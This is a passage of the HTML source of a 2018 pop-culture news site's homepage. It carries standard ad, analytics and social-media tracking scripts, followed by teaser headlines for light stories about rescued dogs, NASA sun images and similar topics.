<!doctype html>
<html class="no-js" lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
	<meta charset="UTF-8">
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<link rel="shortcut icon" type="image/png"
	      href="http://ninjajournalist.com/wp-content/themes/ninjajournalist/favicon.png"/>


	<title>NinjaJournalist | News For Ninjas</title>

<!-- This site is optimized with the Yoast SEO plugin v3.4.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="NinjaJournalist is the place for up-to-date pop-culture news. Find out what’s trending and never be out of the loop."/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="http://ninjajournalist.com/" />
<link rel="next" href="http://ninjajournalist.com/page/2/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="website" />
<meta property="og:title" content="NinjaJournalist | News For Ninjas" />
<meta property="og:description" content="NinjaJournalist is the place for up-to-date pop-culture news. Find out what’s trending and never be out of the loop." />
<meta property="og:url" content="http://ninjajournalist.com/" />
<meta property="og:site_name" content="NinjaJournalist" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="NinjaJournalist is the place for up-to-date pop-culture news. Find out what’s trending and never be out of the loop." />
<meta name="twitter:title" content="NinjaJournalist | News For Ninjas" />
<script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"WebSite","url":"http:\/\/ninjajournalist.com\/","name":"NinjaJournalist","potentialAction":{"@type":"SearchAction","target":"http:\/\/ninjajournalist.com\/?s={search_term_string}","query-input":"required name=search_term_string"}}</script>
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//s.w.org' />
<link rel='stylesheet' id='ninjajournalist-style-main-css'  href='http://ninjajournalist.com/wp-content/themes/ninjajournalist/styles/main.css?ver=4.8.3' type='text/css' media='all' />
<link rel='stylesheet' id='ninjajournalist-style-css'  href='http://ninjajournalist.com/wp-content/themes/ninjajournalist/style.css?ver=4.8.3' type='text/css' media='all' />
<script type='text/javascript' src='http://ninjajournalist.com/wp-content/themes/ninjajournalist/scripts/vendor.js?ver=4.8.3'></script>
<script type='text/javascript' src='http://ninjajournalist.com/wp-content/themes/ninjajournalist/scripts/vendor/modernizr.js?ver=4.8.3'></script>
<link rel='https://api.w.org/' href='http://ninjajournalist.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://ninjajournalist.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://ninjajournalist.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.8.3" />
    <script>
      function storage(key, value) {
          var lsSupport = false;
          // Check for native support
          if (sessionStorage) {
              lsSupport = true;
          }
          // Value supplied, set new or modify store
          if (typeof value !== "undefined" && value !== null) {
              if (typeof value === 'object') {
                  value = JSON.stringify(value);
              }
              if (lsSupport) {
                  sessionStorage.setItem(key, value);
              } else {
                  createCookie(key, value, 30);
              }
          }
          // No value supplied, return value
          else if (typeof value === "undefined") {
              if (lsSupport) {
                  data = sessionStorage.getItem(key);
              } else {
                  data = readCookie(key);
              }
              return data;
          }
          // Null specified, remove store
          else if (value === null) {
              if (lsSupport) {
                  sessionStorage.removeItem(key);
              } else {
                  createCookie(key, '', -1);
              }
          }
          /**
           * Creates new cookie or removes cookie with negative expiration
           * @param  key       The key or identifier for the store
           * @param  value     Contents of the store
           * @param  exp       Expiration - creation defaults to 30 days
           */
          function createCookie(key, value, exp) {
              var date = new Date();
              date.setTime(date.getTime() + (exp * 24 * 60 * 60 * 1000));
              var expires = "; expires=" + date.toGMTString();
              document.cookie = key + "=" + value + expires + "; path=/";
          }
          /**
           * Returns contents of cookie
           * @param  key       The key or identifier for the store
           */
          function readCookie(key) {
              var nameEQ = key + "=";
              var ca = document.cookie.split(';');
              for (var i = 0, max = ca.length; i < max; i++) {
                  var c = ca[i];
                  while (c.charAt(0) === ' ') c = c.substring(1, c.length);
                  if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
              }
              return null;
          }
      }

      function getParameterByName(name) {
          name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
          var regex = new RegExp('[\\?&]' + name + '=([^&#]*)'),
              results = regex.exec(location.search);
          return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
      }

      function getUtmSource(){
          var STORAGE_SOURCE_KEY = 'cm_tracker_utm_source';
          var source = getParameterByName('utm_source');
          return source ? source : (storage(STORAGE_SOURCE_KEY) && storage(STORAGE_SOURCE_KEY) !== '' ? storage(STORAGE_SOURCE_KEY) : 'direct');
      }

      function getUtmCampaign(){
          var SOURCE_CAMPAIGN_KEY = 'cm_tracker_utm_campaign';
          var campaign = getParameterByName('utm_campaign');
          return campaign ? campaign : (storage(SOURCE_CAMPAIGN_KEY) && storage(SOURCE_CAMPAIGN_KEY) !== '' ? storage(SOURCE_CAMPAIGN_KEY) : 'direct');
      }

      function getUtmMedium(){
          var SOURCE_MEDIUM_KEY = 'cm_tracker_utm_medium';
          var medium = getParameterByName('utm_medium');
          return medium ? medium : (storage(SOURCE_MEDIUM_KEY) && storage(SOURCE_MEDIUM_KEY) !== '' ? storage(SOURCE_MEDIUM_KEY) : 'direct');
      }

      function getPageNumber(){
          var index = (document.location.pathname[document.location.pathname.length - 1] == '/')? 2 : 1;
          var number = Number(document.location.pathname.split('/')[document.location.pathname.split('/').length - index]);
          return number? number : 1;
      }
    </script>

    			<meta property="fb:pages" content="997362663618747" />
							<meta property="ia:markup_url" content="http://ninjajournalist.com/science/message-in-a-bottle/?ia_markup=1" />
				<meta property="fb:pages" content="997362663618747" />

<script type="text/javascript">
  var taboola_account = 'ninjajournalist';
  var taboola_platform =  'desktop';
  
  var STORAGE_SOURCE_KEY = 'cm_tracker_utm_source';
  var taboola_source = getParameterByName('utm_source');
  taboola_source = taboola_source ? taboola_source : (storage(STORAGE_SOURCE_KEY) && storage(STORAGE_SOURCE_KEY) !== '' ? storage(STORAGE_SOURCE_KEY) : 'direct');
  taboola_source = taboola_source.toLowerCase();

  if (taboola_platform == 'mobile') {
    if (taboola_source == 'taboola') {
      taboola_account += '-mobilet';
    }
    else if (taboola_source == 'facebook') {
      taboola_account += '-mobilef';
    }
    else {
      taboola_account += '-mobiler';
    }
  }
  else if (taboola_platform == 'desktop') {
    if (taboola_source == 'taboola') {
      taboola_account += '-desktopt';
    }
    else {
      taboola_account += '-desktopr';
    }
  }
  
  window._taboola = window._taboola || [];
  _taboola.push({article:'auto'});
  !function (e, f, u, i) {
    if (!document.getElementById(i)){
      e.async = 1;
      e.src = u;
      e.id = i;
      f.parentNode.insertBefore(e, f);
    }
  }(document.createElement('script'),
  document.getElementsByTagName('script')[0],
  '//cdn.taboola.com/libtrc/' + taboola_account + '/loader.js',
  'tb_loader_script');
</script>

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.8";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<!-- GA -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-65682598-1', 'auto');
  ga('send', 'pageview');

</script>

<!-- UNDERDOGMEDIA UTM Tracking Code Start -->
<script data-cfasync="false" language="javascript" async src="//bid.underdog.media/udm_tracker.js"></script>
<!-- UNDERDOGMEDIA UTM Tracking Code End -->

<!-- Begin comScore Tag -->
<script>
  var _comscore = _comscore || [];
  _comscore.push({ c1: "2", c2: "20535424" });
  (function() {
    var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
    s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
    el.parentNode.insertBefore(s, el);
  })();
</script>
<noscript>
  <img src="http://b.scorecardresearch.com/p?c1=2&c2=20535424&cv=2.0&cj=1" />
</noscript>
<!-- End comScore Tag -->

<!-- Hotjar Tracking Code for http://www.ninjajournalist.com -->
<script>
    (function(h,o,t,j,a,r){
        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
        h._hjSettings={hjid:539997,hjsv:5};
        a=o.getElementsByTagName('head')[0];
        r=o.createElement('script');r.async=1;
        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
        a.appendChild(r);
    })(window,document,'//static.hotjar.com/c/hotjar-','.js?sv=');
</script>

<script type="text/javascript" src="http://d1rlca3pqma1yp.cloudfront.net/abdetector.js"></script> 

<!-- Facebook Pixel Code -->
<script>
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
document,'script','https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '560102780826976'); // Insert your pixel ID here.
fbq('track', 'PageView');
  
function adBlockUndetected () {
    window.usingAdBlock = false
    window._fbq.push(['track', 'NotUsingAdBlocker', {}])
  }

  function adBlockDetected () {
    window.usingAdBlock = true
    window._fbq.push(['track', 'UsingAdBlocker', {}])
  }

  if (typeof window.adBlockDetector === 'undefined') {
    adBlockDetected()
  } else {
    window.adBlockDetector
      .on(true, adBlockDetected)
      .on(false, adBlockUndetected)
  }
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=560102780826976&ev=PageView&noscript=1"
/></noscript>
<!-- DO NOT MODIFY -->
<!-- End Facebook Pixel Code -->

<script type="application/javascript">(function(w,d,t,r,u){w[u]=w[u]||[];w[u].push({'projectId':'10000','properties':{'pixelId':'10007617'}});var s=d.createElement(t);s.src=r;s.async=true;s.onload=s.onreadystatechange=function(){var y,rs=this.readyState,c=w[u];if(rs&&rs!="complete"&&rs!="loaded"){return}try{y=YAHOO.ywa.I13N.fireBeacon;w[u]=[];w[u].push=function(p){y([p])};y(c)}catch(e){}};var scr=d.getElementsByTagName(t)[0],par=scr.parentNode;par.insertBefore(s,scr)})(window,document,"script","https://s.yimg.com/wi/ytc.js","dotq");</script><script type='text/javascript'>var PREBID_TIMEOUT = 1600; var adUnits = eval(atob("W10="));var pbjs = pbjs || {}; pbjs.que = pbjs.que || []; pbjs.bidderSettings = {aol: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.8;}},districtmDMX: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.85;}},brealtime: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.85;}}};</script>
    <script type="text/javascript" src="//s.ntv.io/serve/load.js" async></script>
    
   <script type="text/javascript" src="//d1upt0rqzff34l.cloudfront.net/NJ/prebid.js" async></script>


  <script>


      
      
    var googletag = googletag || {};
    googletag.cmd = googletag.cmd || [];
    googletag.cmd.push(function() {
        googletag.pubads().disableInitialLoad();
        googletag.pubads().collapseEmptyDivs(true);
        googletag.pubads().setTargeting("pageNumber", String(getPageNumber()));
        googletag.pubads().setTargeting("utmSource", getUtmSource());
    });

    
            !function(a9,a,p,s,t,A,g){if(a[a9])return;function q(c,r){a[a9]._Q.push([c,r])}a[a9]={init:function(){q("i",arguments)},fetchBids:function(){q("f",arguments)},setDisplayBids:function(){},targetingKeys:function(){return[]},_Q:[]};A=p.createElement(s);A.async=!0;A.src=t;g=p.getElementsByTagName(s)[0];g.parentNode.insertBefore(A,g)}("apstag",window,document,"script","//c.amazon-adsystem.com/aax2/apstag.js");

            apstag.init({pubID: '3a86fa29-b4f3-464d-8429-0c8459f80d50', adServer: 'googletag'});

            apstag.fetchBids({
                slots: [
                    
                        {slotName: '/117633477/NJ-Desktop-Low', sizes: [[728, 90]], slotID: 'ad_pos_nj-desktop-low'},
                        {slotName: '/117633477/NJ-Desktop-Top', sizes: [[728, 90]], slotID: 'ad_pos_nj-desktop-top'},
                        {slotName: '/117633477/NJ-RR-ATF', sizes: [[300, 250]], slotID: 'ad_pos_nj-rr-atf'},
                        {slotName: '/117633477/NJ-RR-BTF', sizes: [[300, 250]], slotID: 'ad_pos_nj-rr-btf'},
                        {slotName: '/117633477/NJ-RR-MID', sizes: [[300, 600], [300, 250]], slotID: 'ad_pos_nj-rr-mid'},
                                        ],
                timeout: 2e3
            }, function(bids) {
                googletag.cmd.push(function(){
                    apstag.setDisplayBids();
                });
            });
        

    pbjs.que.push(function() {
        pbjs.setPriceGranularity({
            "buckets" : [{
                "precision": 2,
                "min" : 0,
                "max" : 3,
                "increment" : 0.01
            },
                {
                    "precision": 2,
                    "min" : 3,
                    "max" : 5,
                    "increment" : 0.05
                },
                {
                    "precision": 2,
                    "min" : 5,
                    "max" : 10,
                    "increment" : 0.1
                },
                {
                    "precision": 2,
                    "min" : 10,
                    "max" : 30,
                    "increment" : 0.5
                }]
        });
        pbjs.addAdUnits(adUnits);
        pbjs.requestBids({
            bidsBackHandler: sendAdserverRequest
        });
    });

	pbjs.que.push(function() {
	    pbjs.enableAnalytics({
	        provider: 'cmv2'
	    });
	});

    function sendAdserverRequest() {
        if (pbjs.adserverRequestSent) return;
        pbjs.adserverRequestSent = true;
        googletag.cmd.push(function() {
            pbjs.que.push(function() {
                pbjs.setTargetingForGPTAsync();
                googletag.pubads().refresh();
            });
        });
    }

    setTimeout(function() {
        sendAdserverRequest();
    }, PREBID_TIMEOUT);



  </script>

  <script>
    (function () {
        var gads = document.createElement('script');
        gads.async = true;
        gads.type = 'text/javascript';
        var useSSL = 'https:' == document.location.protocol;
        gads.src = (useSSL ? 'https:' : 'http:') +
                '//www.googletagservices.com/tag/js/gpt.js';
        var node = document.getElementsByTagName('script')[0];
        node.parentNode.insertBefore(gads, node);
    })();
  </script>

<script>
		googletag.cmd.push(function () {
					googletag.defineSlot('/117633477/NJ-RR-BTF', [300, 250], 'ad_pos_nj-rr-btf').addService(googletag.pubads());
            googletag.defineSlot('/117633477/NJ-RR-ATF', [300, 250], 'ad_pos_nj-rr-atf').addService(googletag.pubads());
			googletag.defineSlot('/117633477/NJ-RR-MID', [[300, 600], [300, 250]], 'ad_pos_nj-rr-mid').addService(googletag.pubads());
			googletag.defineSlot('/117633477/NJ-Desktop-Low', [728, 90], 'ad_pos_nj-desktop-low').addService(googletag.pubads());
			googletag.defineSlot('/117633477/NJ-Desktop-Top', [728, 90], 'ad_pos_nj-desktop-top').addService(googletag.pubads());
			googletag.defineOutOfPageSlot('/117633477/NJ-EDGE', 'ad_pos_nj-edge').addService(googletag.pubads());
			
        googletag.pubads().enableSingleRequest();
        googletag.enableServices();


    });
  </script>
</head>
<body class="home blog">
<script src="http://d1rlca3pqma1yp.cloudfront.net/minder-tracker.js"></script>

<!--[if lt IE 10]>
<p class="browserupgrade">You are using an <strong>outdated</strong> browser.
	Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve
	your experience.</p>
<![endif]-->
<header id="top_header">
<div id="second_top_nav" class="hidden-xs">
	<div class="container">
		<div class="row">
						<div class="col-xs-3">
				<ul class="list-inline second_nav top-social-links">
					<li><a href="https://www.facebook.com/ninjajournalist/" target="_blank"><span class="icon icon-fb2"></span></a></li>
					<li><a href="https://twitter.com/NinjaJournalist" target="_blank"><span class="icon icon-tw2"></span></a></li>
<!--					<li><a href="//pinterest.com"><span class="icon icon-pt2"></span></a></li>-->
				</ul>
			</div>
		</div>
	</div>
</div><nav class="navbar navbar-default" id="top_nav">
	<div class="container">
		<div class="navbar-header">
			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar"
			        aria-expanded="false" aria-controls="navbar">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			<a class="navbar-brand" href="http://ninjajournalist.com">
									<img src="http://ninjajournalist.com/wp-content/themes/ninjajournalist/images/logo.png" alt="NinjaJournalist" class="logo-image img-responsive">
							</a>
		</div>
		<div id="navbar" class="navbar-collapse collapse navbar-right"><ul id="menu-top-menu" class="nav navbar-nav"><li id="menu-item-2179" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2179"><a title="World" href="http://ninjajournalist.com/category/world/">World</a></li>
<li id="menu-item-2180" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2180"><a title="Science" href="http://ninjajournalist.com/category/science/">Science</a></li>
<li id="menu-item-2181" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2181"><a title="Entertainment" href="http://ninjajournalist.com/category/entertainment/">Entertainment</a></li>
<li id="menu-item-2478" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2478"><a title="Social" href="http://ninjajournalist.com/category/social/">Social</a></li>
<li id="menu-item-4247" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4247"><a title="Business" href="http://ninjajournalist.com/category/business/">Business</a></li>
<li id="menu-item-4249" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4249"><a title="Politics" href="http://ninjajournalist.com/category/politics/">Politics</a></li>
</ul></div>		<!--/.navbar-collapse -->
	</div>
</nav></header>

<main id="main_content">
	<div id="banner">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<div class="top_block_big">
										<article>
				<a href="http://ninjajournalist.com/science/message-in-a-bottle/" class="wrapp_item">
					<div class="img_article" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/03/08125115/b966f06bfa5c0494acee0a86a9d3fc910aa1002f-800x430.jpg')"></div>
					<div class="item_text">
						<h2 class="header_item">Message In A Bottle Discovered In Australia Is The Oldest Ever Found</h2>
						<hr class="post-yellow-divider">
						<p class="meta_item"><span class="author_name"> Meagan Nantwich - </span> <span
								class="date_item">15 hours ago</span></p>
					</div>
				</a>
			</article>
			</div><!--top_block_big-->			</div>
		</div>
	</div>
</div>
	<div id="banner_widget" class="hidden-xs hidden-sm">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<div class="wrap_ads_center">
											 <div style="text-align: center;"> <div id="text-2" class="widget_text banner-widget-center"><div class="ads">			<div class="textwidget">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- NJ D Floor WW (Dynamic) -->
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-4218982396219093"
     data-ad-slot="3838131967"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</div>
		</div></div>
 </div> 									</div>
			</div>
		</div>
	</div>
</div>	
<div id="three_post_blocks">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<div class="tpb_items_wrap">
																										<div class="tpb_item">
								<a href="http://ninjajournalist.com/business/facebook-empowering-female-entrepreneurs/" class="tpb_item_inner">
									<div class="tpb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/03/18133524/facebook31-389x222.jpg')"></div>
									<div class="tpb_text">
										<div class="tpb_btn">Business</div>
										<h2 class="tpb_head">How Facebook Is Empowering Female Entrepreneurs</h2>
										<p class="tpb_meta_item"><span class="tpb_author_name"> Samantha Wells - </span> <span class="tpb_date_item">Mar 17, 2018</span>
										</p>
									</div>
								</a>
							</div><!--tpb_item-->
																												<div class="tpb_item">
								<a href="http://ninjajournalist.com/social/washington-state-deaf-k-9/" class="tpb_item_inner">
									<div class="tpb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/03/08112057/BBJZnXw-389x222.jpeg')"></div>
									<div class="tpb_text">
										<div class="tpb_btn">Social</div>
										<h2 class="tpb_head">Washington State Adds First Deaf K-9 To Their Roster</h2>
										<p class="tpb_meta_item"><span class="tpb_author_name"> Meagan Nantwich - </span> <span class="tpb_date_item">Mar 15, 2018</span>
										</p>
									</div>
								</a>
							</div><!--tpb_item-->
																												<div class="tpb_item">
								<a href="http://ninjajournalist.com/social/impersonating-police-officer/" class="tpb_item_inner">
									<div class="tpb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/03/12150217/download-17-389x222.jpeg')"></div>
									<div class="tpb_text">
										<div class="tpb_btn">Social</div>
										<h2 class="tpb_head">Why Was This 14-Year-Old Impersonating A Police Officer?</h2>
										<p class="tpb_meta_item"><span class="tpb_author_name"> Samantha Wells - </span> <span class="tpb_date_item">Mar 12, 2018</span>
										</p>
									</div>
								</a>
							</div><!--tpb_item-->
							
				</div><!--tpb_item_wrap-->
			</div>
		</div>
	</div>
</div>	<div id="three_blocks">
	<div class="container">
		<div class="row">
			<div class="col-xs-12 col-sm-4 col-sm-push-8">
	<div class="three_blocks_item three_blocks_item_social">
		<div class="td_block_social_counter td-pb-border-top">
			<div class="td_social_type td_social_facebook">
				<div class="td-sp td-sp-facebook"></div>
<!--				<span class="td_social_info">6,238</span>-->
				<span class="td_social_info td_social_info_name"></span>
				<span class="td_social_button"><a href="https://www.facebook.com/ninjajournalist/" target="_blank">Like</a></span>
			</div>
			<div class="td_social_type td_social_twitter">
				<div class="td-sp td-sp-twitter"></div>
<!--				<span class="td_social_info">34,736</span>-->
				<span class="td_social_info td_social_info_name"></span>
				<span class="td_social_button"><a href="https://twitter.com/NinjaJournalist" target="_blank">Follow</a></span>
			</div>
<!--			<div class="td_social_type td_social_youtube">-->
<!--				<div class="td-sp td-sp-youtube"></div>-->
<!--				<span class="td_social_info">4,675</span>-->
<!--				<span class="td_social_info td_social_info_name">Subscribers</span><span class="td_social_button"><a href="//www.youtube.com/">Subscribe</a></span>-->
<!--			</div>-->
		</div>
					 <div style="text-align: center;"> <div id="text-3" class="widget_text widget tbis_ads hidden-xs">			<div class="textwidget">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- NJ - HomePage -->
<ins class="adsbygoogle"
     style="display:inline-block;width:300px;height:250px"
     data-ad-client="ca-pub-4218982396219093"
     data-ad-slot="9786287160"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</div>
		</div>
 </div> 		
	</div><!--three_blocks_item_social-->
</div>			
<div class="col-xs-12 col-sm-4 col-sm-pull-4">

										<div class="three_blocks_item three_blocks_item_post">
				<a href="http://ninjajournalist.com/social/labrador-missing-10-years/">
					<p class="tb_top_meta">Owner Welcomes Home Labrador 10 Years After Going Missing</p>
					<div class="tb_img_wrap">
						<div class="tb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/03/08133149/labrador-3-389x222.jpg')"></div>
					</div>
					<p class="tb_text">



Debra Suierveld was absolutely distraught when her black Labrador Abby went missing over ten years ago. However, the adorable dog ended up...</p>
					<p class="tb_slogan"></p>
				</a>
			</div><!--three_blocks_item_post-->
			
</div>			
<div class="col-xs-12 col-sm-4 col-sm-pull-4">
	<div class="three_blocks_item three_blocks_item_center">
		<hr class="tbcb_border visible-xs-block">
							<div class="tbcb_item">
				<a href="http://ninjajournalist.com/social/mike-tysons-mansion-church/">
					<h2 class="tbcb_item_head">Mike Tyson&#8217;s Abandoned Mansion Is Being Converted Into A Church</h2>
					<p class="tbcb_item_meta">
						<span class="tbcb_item_author">Meagan Nantwich</span> - <span class="tbcb_item_date">Mar 8, 2018</span>
					</p>
				</a>
			</div>
									<div class="tbcb_item">
				<a href="http://ninjajournalist.com/world/slave-olympics-air-force/">
					<h2 class="tbcb_item_head">Former Slave Flees To US, Competes Twice In Olympics &#038; Joins Air Force</h2>
					<p class="tbcb_item_meta">
						<span class="tbcb_item_author">JJ Foster</span> - <span class="tbcb_item_date">Mar 7, 2018</span>
					</p>
				</a>
			</div>
			
		<hr class="tbcb_border visible-xs-block">
	</div><!--three_blocks_item_center-->
</div>		</div>
	</div>
</div>
	<div id="wide_block">
	<div class="container">
		<div class="row">
			<div class="col-xs-12 col-sm-8">
						<div class="wb_wide">
			<a href="http://ninjajournalist.com/social/pomsky-puppy-human-activity/">
				<div class="wb_wide_img_wrap">
					<div class="wb_wide_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/03/05150839/49D755F700000578-5461849-image-a-37_1520215421778-e1520262564934-634x305.jpg')"></div>
				</div>
				<div class="wb_wide_content">
					<h2 class="wb_wide_head">Adorable Pomsky Puppy Loves Participating In This Human Activity</h2>
					<p class="wb_wide_text visible-xs-block">



When most dogs are faced with any sort of grooming, they tend to shy away, whether it be brushing their fur, getting a bath, clipping their...</p>
					<p class="read_more">read more</p>
				</div>
			</a>
		</div>
		</div>			<div class="col-xs-12 col-sm-4">
						<div class="wb_right">
			<a href="http://ninjajournalist.com/social/app-rewards-you-smartphone/">
				<div class="wb_right_img_wrap">
					<div class="wb_right_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/03/01143747/phones1-93x67.jpg')"></div>
				</div>
				<h2 class="wb_right_text">The App That Rewards You For Putting Down Your Smartphone</h2></a>
		</div>
								<div class="wb_right">
			<a href="http://ninjajournalist.com/business/new-skills-employers/">
				<div class="wb_right_img_wrap">
					<div class="wb_right_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/01/10145423/work1-e1515596119216-93x67.jpg')"></div>
				</div>
				<h2 class="wb_right_text">The Six New Skills Employers Will Be On The Look Out For</h2></a>
		</div>
								<div class="wb_right">
			<a href="http://ninjajournalist.com/world/smallest-town-america/">
				<div class="wb_right_img_wrap">
					<div class="wb_right_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/03/01150639/download-16-93x67.jpeg')"></div>
				</div>
				<h2 class="wb_right_text">Take A Look At America&#8217;s Smallest Town &#8211; A Population Of 1</h2></a>
		</div>
		</div>		</div>
	</div>
</div>
	<div id="main_block">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<hr class="divider_main_block">
				<div class="main_block_item_wrap clearfix">
																			
							<div class="main_block_item">
								<a href="http://ninjajournalist.com/science/nasa-images-sun-purple/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/02/14151230/purple-1-389x222.png')"></div>
									</div>

									<h2 class="mb_head">NASA Takes Stunning Images Of Moment The Sun Turned Purple</h2>
									<p class="mb_text">



When the earth had its view of the Sun blocked, NASA couldn't anticipate the purple effect that would be created in the images they recently...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																					
							<div class="main_block_item">
								<a href="http://ninjajournalist.com/business/tech-upgrades-environment/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/02/20155413/5a71948316000020001394ca-389x222.jpeg')"></div>
									</div>

									<h2 class="mb_head">Constant Tech Upgrades Are Having A Negative Impact On The Environment</h2>
									<p class="mb_text">



As connected as our worlds already are, we're still only on the brink of the smart home revolution. While smart assistants are becoming more...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																					
							<div class="main_block_item">
								<a href="http://ninjajournalist.com/social/dog-rescued-new-york-city-subway/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/02/20161608/Screen-Shot-2018-02-20-at-6.13.58-PM-389x222.png')"></div>
									</div>

									<h2 class="mb_head">A Dog Was Rescued From A New York City Subway Tunnel</h2>
									<p class="mb_text">



New York City may seem to outsiders as the opposite of a neighborly kind of community, but there's one thing they're happy to band together...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																					
							<div class="main_block_item">
								<a href="http://ninjajournalist.com/science/coffee-cancer/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/02/07123245/woman-drinking-coffee-389x222.jpg')"></div>
									</div>

									<h2 class="mb_head">New Suit Proves Coffee Is A Cancer Catalyst</h2>
									<p class="mb_text">



The state of California has formed a list of chemicals it considers to be a catalyst or cause of cancer, and one of which is found in the...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																					
							<div class="main_block_item">
								<a href="http://ninjajournalist.com/science/george-washingtons-hair/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/02/20151216/george-washington-hair-02-ap-mt-180219_4x3_992-389x222.jpg')"></div>
									</div>

									<h2 class="mb_head">A Lock Of George Washington&#8217;s Hair May Have Been Discovered</h2>
									<p class="mb_text">



Union College, located in Schenectady, New York is claiming that they've uncovered a piece of George Washington's hair located in one of...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																					
							<div class="main_block_item">
								<a href="http://ninjajournalist.com/science/self-deprecating-humor/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d3m2ca683sarz5.cloudfront.net/wp-content/uploads/2018/02/22132033/504397870-389x222.jpg')"></div>
									</div>

									<h2 class="mb_head">Self-Deprecating Humor May Be Good For You After-all</h2>
									<p class="mb_text">



Researchers from the Mind, Brain and Behavior Research Center in Spain are telling us that laughing at oneself may be beneficial. While...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																					
							<div class="main_block_item">
								<a href="http://ninjajournalist.com/world/tigress-human-help-starving/">
									<div class="mb_img_wrap">
